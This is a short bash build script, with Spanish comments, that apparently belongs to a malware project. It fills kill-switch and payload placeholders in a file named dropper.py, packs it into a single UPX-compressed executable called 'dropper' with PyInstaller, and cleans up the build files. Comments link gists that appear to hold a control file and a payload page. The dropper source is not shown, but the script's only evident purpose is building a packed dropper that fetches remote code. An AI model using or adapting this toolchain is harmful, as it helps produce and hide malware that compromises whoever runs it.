#!/bin/bash
#https://gist.githubusercontent.com/apachete24/7202e9ccfa8b5008a12ce38563766081/raw/5f8b4866e06d149222552e3524761601c887d767/control
#https://gist.githubusercontent.com/apachete24/70b0c75e9870905b17342f80700e3c19/raw/8acc7e6730c3c5ffc25e33758333cfc14e5d0f22/foroSuperseguro.html
sed -i "s|REEMPLAZAR_KILL|$1|g" dropper.py
sed -i "s|REEMPLAZAR_PAYLOAD|$2|g" dropper.py

pyinstaller --onefile --upx-dir /usr/bin/upx-ucl --name dropper dropper.py
# Que el droper quede en la carpeta actual del proyecto
mv dist/dropper ./
rm -r ./dist
rm dropper.spec